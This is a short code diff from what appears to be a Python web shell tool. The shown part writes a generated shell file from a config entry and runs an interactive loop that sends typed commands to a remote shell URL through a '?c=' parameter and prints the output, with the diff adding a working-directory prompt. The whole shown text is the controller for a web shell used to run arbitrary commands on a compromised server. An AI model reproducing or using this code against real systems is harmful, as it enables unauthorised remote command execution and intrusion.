@@ -26,14 +26,12 @@ if args.generate:
 
     opfile.write(config['DEFAULT']['code'])
     opfile.close()
-    print(shell+' is generated')
-
+    print('Generated file '+shell)
 
 if args.shell_url:
-    url = str(args.shell_url)
+    pwd = get(args.shell_url + "?c=pwd").text.replace("\n", "")
+    pwd += "$ "
     while True:
-        cmd = str(input(">>> "))
-        if cmd == 'exit':
-            break;
-        r = get(url+"?c={0}".format(cmd)).text
-        print(r)
+        command = input(pwd)
+        result = get(args.shell_url + "?c=" + command).text
+        print(result)
